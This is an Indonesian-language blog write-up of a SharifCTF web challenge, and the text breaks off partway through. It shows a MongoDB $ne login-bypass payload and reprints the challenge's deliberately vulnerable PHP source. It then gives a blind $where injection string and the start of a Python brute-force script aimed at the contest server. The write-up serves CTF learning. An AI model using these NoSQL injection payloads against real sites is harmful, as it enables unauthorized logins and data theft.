---
id: 262
title: Mongo Db Injection | Sharif CTF | Indonesian Backtrack Gathering
date: 2014-10-21T07:46:21+00:00
author: abdilahrf
layout: post
guid: http://www.hasnydes.us/?p=262
permalink: /2014/10/mongo-db-injection-sharif-ctf-indonesian-backtrack-gathering/
category: Web Exploitation
tags: [SharifCTF]
---
ctf.sharif.edu kompetisi ctf internasional yang gk sengaja ane temuin di google dan menemukan challange mongodb injection + writeupnya yang sangat menarik dalam soal itu seperti ini instruksinya

> <pre><code class="language-text" data-lang="text">login and find the flag
http://ctf.sharif.edu:25489
</code></pre>

tampilan websitenya seperti ini  :

[<img class="aligncenter size-full wp-image-263" src="http://abdilahrf.me/images/2014/10/sharif14_beginning.png" alt="sharif14_beginning" width="580" height="321" />](http://abdilahrf.me/images/2014/10/sharif14_beginning.png)

&nbsp;

ada form login dengan field username+password+captcha

pertama yang saya lakukan coba untuk view page source untuk mencari clue&#8221; , dan tidak ada   . kemudian coba untuk login menggunakan bypass sqli menggunakan &#8216; OR &#8216; = 1=1 ,dsb

favicon di website tersebut coba kita scan menggunakan exiftool

> <pre><code class="language-bash" data-lang="bash">&lt;span class="c"># exiftool favicon.png&lt;/span>
&lt;span class="o">[&lt;/span>...&lt;span class="o">]&lt;/span>

File Name         : favicon.png
Directory         : .
File Size         : 2.6 kB
File Modification : 2014:09:23 12:59:18+02:00
File Permissions  : rw-r--r--
File Type         : PNG
MIME Type         : image/png

&lt;span class="o">[&lt;/span>...&lt;span class="o">]&lt;/span>

Thumb URI : file:///Users/alz/Developer/git/pictonic/assets/svgs/3e91140ac1bfb9903b91c1b0ca092167.svg

&lt;span class="o">[&lt;/span>...&lt;span class="o">]
&lt;/span></code></pre>

Menarik file png yang jadi favicon itu ternyata hasil conver dari file .svg , coba kita search file svg nya di google

<!--more-->

[<img class="aligncenter size-full wp-image-264" src="http://abdilahrf.me/images/2014/10/sharif14_google_svg.png" alt="sharif14_google_svg" width="774" height="272" />](http://abdilahrf.me/images/2014/10/sharif14_google_svg.png)

&nbsp;

dan 😀 kita mengetahui sekarang bahwa backend untuk database mereka bukan pakai MySQL/PgSQL tapi pakai MongoDB

karena kita sudah tau menggunakan MongoDB coba cari cara untuk menyerang MongoDB seperti ini

[idontplaydarts.com &#8211; &#8220;Mongodb is vulnerable to SQL injection in PHP at least](https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/)

Di website itu kita belajar bagaimana MongoDB + Php bekerja

> <pre><code class="language-php" data-lang="php">&lt;span class="x">$collection-&gt;find(array(&lt;/span>
&lt;span class="x">    "username" =&gt; $_GET['username'],&lt;/span>
&lt;span class="x">    "passwd" =&gt; $_GET['passwd']&lt;/span>
&lt;span class="x">));

&lt;/span></code></pre>

Script di atas sama dengan

> <pre><code class="language-php" data-lang="php">&lt;span class="x">mysql_query("SELECT * FROM collection&lt;/span>
&lt;span class="x">    WHERE username=" . $_GET['username'] . ",&lt;/span>
&lt;span class="x">    AND passwd=" . $_GET['passwd'])&lt;/span></code></pre>

biasanya untuk bypass login form kita buat query selalu mengembalikan nilai true walaupun yang kita masukan username dan password salah seperti

> <pre><code class="language-php" data-lang="php">&lt;span class="x">$collection-&gt;find(array(&lt;/span>
&lt;span class="x">    "username" =&gt; "admin",&lt;/span>
&lt;span class="x">    "passwd" =&gt; array("$ne" =&gt; 1)&lt;/span>
&lt;span class="x">));&lt;/span></code></pre>

$ne adalah operator mongodb yang maksudnya != ( tidak sama dengan )
  
Sama Dengan

> <pre><code class="language-sql" data-lang="sql">&lt;span class="k">SELECT&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="k">FROM&lt;/span> &lt;span class="n">collection&lt;/span>
&lt;span class="k">WHERE&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="ss">"admin"&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="k">AND&lt;/span> &lt;span class="n">passwd&lt;/span>&lt;span class="o">!=&lt;/span>&lt;span class="mi">1&lt;/span></code></pre>

Dari 2 script di atas kita ketahui bahwa jika passwd != 1 maka nilai yang di kembalikan query (true) atau benar
  
karena password yang di input tidak benar . maka akan masuk ke dashboard admin

gunakan tamper data untuk mengirimkan post data

> <pre><code class="language-php" data-lang="php">&lt;span class="x">username=admin&password[$ne]=1&captcha=AXBYCZ

&lt;/span></code></pre>

sesuaikan captcha dengan yang benar

selain dengan tamper data , juga bisa menggunakan inspect element atau firebug untuk bypass login

setelah login akan muncul dashboard seperti ini

[<img class="aligncenter wp-image-265 size-large" src="http://abdilahrf.me/images/2014/10/panel-1024x467.png" alt="panel" width="1024" height="467" />](http://abdilahrf.me/images/2014/10/panel.png)

&nbsp;

di panel admin ini di sediakan beberapa source code dari file seperti : login.php , init.php , api.php , panel.php

coba kita lihat ke login.php

>     <?php
>     /**
>      * User: some one
>      * Date: 8/25/14
>      * Time: 11:03 AM
>      */
>     session_start();
>     $m = new MongoClient();
>     $db = $m->ctf5;
>     $users_col = $db->users;
>     $username = $_POST['username'];
>     $password = $_POST['password'];
>     $q = array(
>         'username' => $username,
>         'password' => $password
>     );
>     
>     include 'Captcha.php';
>     $v = Captcha::validate($_POST['captcha']);
>     if ($v) {
>         $_SESSION['time'] = intval(time() / 60);
>         $_SESSION['count'] = 25;
>     }else{
>         die('invalid captcha');
>     }
>     
>     $user = $users_col->findOne($q);
>     if(is_null($user)){
>         #header("Location: login-failed.html");
>         die('invalid username or password');
>     }else{
>         $_SESSION['id'] = $user['_id']->{'$id'};
>         header("Location: panel.php");
>         die();
>     }

kalau di script login.php kita bisa liat array nya dipisah

> `$q = array(<br />
'username' => $username,<br />
'password' => $password<br />
);<br />
$user = $users_col->findOne($q);`

sama dengan

> <pre><code class="language-php" data-lang="php">&lt;span class="x">$collection-&gt;find(array(&lt;/span>
&lt;span class="x">    "username" =&gt; $_GET['username'],&lt;/span>
&lt;span class="x">    "passwd" =&gt; $_GET['passwd']&lt;/span>
&lt;span class="x">));
&lt;/span></code></pre>

lanjut kita liat script init.php

> <pre><code class="language-php" data-lang="php">&lt;span class="cp">&lt;?php&lt;/span>
&lt;span class="sd">/** &lt;/span>
&lt;span class="sd"> * User: some one&lt;/span>
&lt;span class="sd"> * Date: 8/25/14&lt;/span>
&lt;span class="sd"> * Time: 11:00 AM&lt;/span>
&lt;span class="sd"> */&lt;/span>

&lt;span class="k">function&lt;/span> &lt;span class="nf">generateRandomString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
    &lt;span class="nv">$characters&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'&lt;/span>&lt;span class="p">;&lt;/span>
    &lt;span class="nv">$randomString&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">''&lt;/span>&lt;span class="p">;&lt;/span>
    &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nv">$i&lt;/span> &lt;span class="o">&lt;&lt;/span> &lt;span class="nv">$length&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
        &lt;span class="nv">$randomString&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nv">$characters&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$characters&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)];&lt;/span>
    &lt;span class="p">}&lt;/span>
    &lt;span class="k">return&lt;/span> &lt;span class="nv">$randomString&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>

&lt;span class="nv">$m&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">MongoClient&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nv">$db&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$m&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">ctf5&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$users_col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$db&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">users&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$flag_col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$db&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">flag&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$user&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$users_col&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">findOne&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">'username'&lt;/span> &lt;span class="o">=&gt;&lt;/span> &lt;span class="s1">'admin'&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="nv">$flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$flag_col&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">findOne&lt;/span>&lt;span class="p">();&lt;/span>

&lt;span class="c1">// old codes&lt;/span>
&lt;span class="c1">//$staffs = array('gholi','bobak','bijan','arash');&lt;/span>
&lt;span class="c1">//&lt;/span>
&lt;span class="c1">//foreach($staffs as $staff){&lt;/span>
&lt;span class="c1">//    $users_col-&gt;insert(array(&lt;/span>
&lt;span class="c1">//        'username' =&gt; $staff,&lt;/span>
&lt;span class="c1">//        'role'=&gt;'staff',&lt;/span>
&lt;span class="c1">//        'password' =&gt; generateRandomString(20),&lt;/span>
&lt;span class="c1">//    ));&lt;/span>
&lt;span class="c1">//}&lt;/span>

&lt;span class="c1">//$visitors = array('noone','bob','john','alice');&lt;/span>
&lt;span class="c1">//&lt;/span>
&lt;span class="c1">//foreach($visitors as $visitor){&lt;/span>
&lt;span class="c1">//    $users_col-&gt;insert(array(&lt;/span>
&lt;span class="c1">//        'username' =&gt; $visitor,&lt;/span>
&lt;span class="c1">//        'role'=&gt;'visitor',&lt;/span>
&lt;span class="c1">//        'password' =&gt; generateRandomString(10),&lt;/span>
&lt;span class="c1">//    ));&lt;/span>
&lt;span class="c1">//}&lt;/span>

&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">is_null&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$user&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
    &lt;span class="nv">$users_col&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
        &lt;span class="s1">'username'&lt;/span> &lt;span class="o">=&gt;&lt;/span> &lt;span class="s1">'admin'&lt;/span>&lt;span class="p">,&lt;/span>
        &lt;span class="s1">'role'&lt;/span>&lt;span class="o">=&gt;&lt;/span>&lt;span class="s1">'admin'&lt;/span>&lt;span class="p">,&lt;/span>
        &lt;span class="s1">'password'&lt;/span> &lt;span class="o">=&gt;&lt;/span> &lt;span class="nx">generateRandomString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">),&lt;/span>
    &lt;span class="p">));&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">is_null&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$flag&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
    &lt;span class="nv">$flag_col&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
        &lt;span class="s1">'flag'&lt;/span> &lt;span class="o">=&gt;&lt;/span> &lt;span class="nx">generateRandomString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">),&lt;/span>
    &lt;span class="p">));&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&gt;&lt;/span></code></pre>

penjelasannya di situ ada function random string untuk generate password,id,flag dan ada query insert flag sama insert admin dan init.php ini sepertinya yang akan diload pada setiap file karena koneksi mongodb di buka di script ini

trus coba kita liat script selanjutnya api.php

> <pre><code class="language-php" data-lang="php">&lt;span class="cp">&lt;?php&lt;/span>
&lt;span class="sd">/**&lt;/span>
&lt;span class="sd"> * User: some one&lt;/span>
&lt;span class="sd"> * Date: 8/25/14&lt;/span>
&lt;span class="sd"> * Time: 11:25 AM&lt;/span>
&lt;span class="sd"> */&lt;/span>
&lt;span class="nb">session_start&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">is_null&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'id'&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="p">{&lt;/span>
    &lt;span class="nb">header&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">"Location: index.html"&lt;/span>&lt;span class="p">);&lt;/span>
    &lt;span class="k">die&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nv">$ajax&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'HTTP_X_REQUESTED_WITH'&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="k">AND&lt;/span> &lt;span class="nb">strtolower&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'HTTP_X_REQUESTED_WITH'&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">'xmlhttprequest'&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
    &lt;span class="nv">$ajax&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">true&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nv">$ajax&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
    &lt;span class="k">die&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nv">$T&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">60&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$N&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$t&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">time&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="nv">$T&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'time'&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&lt;&lt;/span> &lt;span class="nv">$t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
    &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'time'&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">intval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">time&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="nv">$T&lt;/span>&lt;span class="p">);&lt;/span>
    &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'count'&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$N&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
    &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'count'&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&lt;=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
        &lt;span class="nb">header&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">'Content-Type: application/json'&lt;/span>&lt;span class="p">);&lt;/span>
        &lt;span class="k">echo&lt;/span> &lt;span class="nb">json_encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">"You are so fast. Please slow down. And wait for one minute."&lt;/span>&lt;span class="p">));&lt;/span>
        &lt;span class="k">die&lt;/span>&lt;span class="p">();&lt;/span>
    &lt;span class="p">}&lt;/span>
    &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'count'&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'count'&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nv">$q&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">''&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'q'&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="p">{&lt;/span>
    &lt;span class="nv">$q&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'q'&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$q&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">'users'&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
    &lt;span class="nv">$role&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'role'&lt;/span>&lt;span class="p">];&lt;/span>
    &lt;span class="nv">$m&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">MongoClient&lt;/span>&lt;span class="p">();&lt;/span>
    &lt;span class="nv">$db&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$m&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">ctf5&lt;/span>&lt;span class="p">;&lt;/span>
    &lt;span class="nv">$users_col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$db&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">users&lt;/span>&lt;span class="p">;&lt;/span>
    &lt;span class="nv">$users&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$users_col&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">find&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
        &lt;span class="s1">'$where'&lt;/span> &lt;span class="o">=&gt;&lt;/span> &lt;span class="s2">"this.role == '&lt;/span>&lt;span class="si">$role&lt;/span>&lt;span class="s2">'"&lt;/span>
    &lt;span class="p">));&lt;/span>
    &lt;span class="nv">$names&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">();&lt;/span>
    &lt;span class="k">foreach&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$users&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="nv">$user&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
        &lt;span class="nv">$names&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$user&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'username'&lt;/span>&lt;span class="p">];&lt;/span>
    &lt;span class="p">}&lt;/span>
    &lt;span class="nb">header&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">'Content-Type: application/json'&lt;/span>&lt;span class="p">);&lt;/span>
    &lt;span class="k">echo&lt;/span> &lt;span class="nb">json_encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$names&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$q&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">'flag'&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
    &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'id'&lt;/span>&lt;span class="p">];&lt;/span>
    &lt;span class="nv">$m&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">MongoClient&lt;/span>&lt;span class="p">();&lt;/span>
    &lt;span class="nv">$db&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$m&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">ctf5&lt;/span>&lt;span class="p">;&lt;/span>
    &lt;span class="nv">$flag_col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$db&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">flag&lt;/span>&lt;span class="p">;&lt;/span>
    &lt;span class="nv">$flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$flag_col&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">findOne&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">'_id'&lt;/span> &lt;span class="o">=&gt;&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">MongoId&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="p">)));&lt;/span>
    &lt;span class="nb">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$flag&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&gt;&lt;/span></code></pre>

fle api.php hanya bisa di buka ketika kita sudah login sehingga $_Session[id] != 0 , dan untuk mengakses file ini kita harus mengganti header dengan XMLHttpRequest

Get parameter Q di gunakan untuk 2 value :

&#8211; Untuk mendapatkan user dengan role yang di spesifikasaikan di GET role

-Untuk mendapatkan flag dengan memasukan id dari role admin

<pre><code class="language-python" data-lang="python">&lt;span class="s">api.php?q=flag&id=

&lt;/span></code>Didalam File init.php admin user dan flag di insert pada waktu yang sama di mongodb kita dapat menganggap $id mereka berturut" jika kita bisa mendapatkan $id admin user maka kita akan mudah untuk mendapatkan $id flag

Kesimpulannya kita mencari : - $id dari admin user , - masukan $id untuk dapatkan flag

</pre>

> <pre><code class="language-php" data-lang="php">&lt;span class="cp">&lt;?php&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$q&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">'users'&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
    &lt;span class="nv">$role&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'role'&lt;/span>&lt;span class="p">];&lt;/span>
    &lt;span class="nv">$m&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">MongoClient&lt;/span>&lt;span class="p">();&lt;/span>
    &lt;span class="nv">$db&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$m&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">ctf5&lt;/span>&lt;span class="p">;&lt;/span>
    &lt;span class="nv">$users_col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$db&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">users&lt;/span>&lt;span class="p">;&lt;/span>
    &lt;span class="nv">$users&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$users_col&lt;/span>&lt;span class="o">-&gt;&lt;/span>&lt;span class="na">find&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
        &lt;span class="s1">'$where'&lt;/span> &lt;span class="o">=&gt;&lt;/span> &lt;span class="s2">"this.role == '&lt;/span>&lt;span class="si">$role&lt;/span>&lt;span class="s2">'"&lt;/span>
    &lt;span class="p">));&lt;/span>
    &lt;span class="nv">$names&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">();&lt;/span>
    &lt;span class="k">foreach&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$users&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="nv">$user&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
        &lt;span class="nv">$names&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$user&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">'username'&lt;/span>&lt;span class="p">];&lt;/span>
    &lt;span class="p">}&lt;/span>
    &lt;span class="nb">header&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">'Content-Type: application/json'&lt;/span>&lt;span class="p">);&lt;/span>
    &lt;span class="k">echo&lt;/span> &lt;span class="nb">json_encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$names&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&gt;&lt;/span></code></pre>

&nbsp;

kita akan melakukan blind mongodb injection untuk menebak dari $id dan memanfaatkan oracle response

> api.php?q=user&role=admin&#8217; && (this._id.str[x]==&#8217;Y&#8217;) && &#8216;1&#8217;==&#8217;1

x dan y adalah yang akan di rubah untuk bruteforce .. ketika response dari oracle == 9 maka digit itu benar kemudian lanjut ke digit selanjutnya

disini pakai python untuk mengimplementasikan attacknya

> <pre><code class="language-python" data-lang="python">&lt;span class="c">#!/usr/bin/python&lt;/span>

&lt;span class="kn">import&lt;/span> &lt;span class="nn">urllib&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="nn">time&lt;/span>

&lt;span class="n">baseUrl&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">"http://ctf.sharif.edu:25489/api.php?q=users&role="&lt;/span>
&lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s">'X-Requested-With'&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">'XMLHttpRequest'&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="n">cookies&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">PHPSESSID&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">'amuedn0ra3fhj0diatdb4kkkt1'&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">admin_id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">''&lt;/span>

&lt;span class="c"># Guessing admin id&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">24&lt;/span>&lt;span class="p">):&lt;/span>
